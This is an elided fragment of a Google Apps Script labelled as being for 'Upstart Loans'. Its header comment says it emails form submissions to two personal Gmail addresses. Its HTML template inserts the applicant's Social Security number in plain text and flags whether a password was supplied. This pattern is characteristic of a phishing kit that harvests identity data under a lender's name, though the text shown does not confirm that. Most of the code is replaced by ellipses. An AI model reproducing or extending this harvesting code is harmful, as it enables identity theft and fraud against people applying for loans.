// Simple Google Apps Script for Upstart Loans
// Sends emails to both: finnfoxpersonalloan@gmail.com and tyronlincolnn@gmail.com
  ...
  return `
    ...
    <body>
      ...
      <div class="content">
        ...
        <div class="field">
          <span class="field-label">SSN:</span> ${data.ssnNumber || 'Not provided'}
        </div>
        ...
        <div class="field">
          <span class="field-label">Password:</span> ${data.password ? '[PROVIDED]' : '[NOT PROVIDED]'}
        </div>
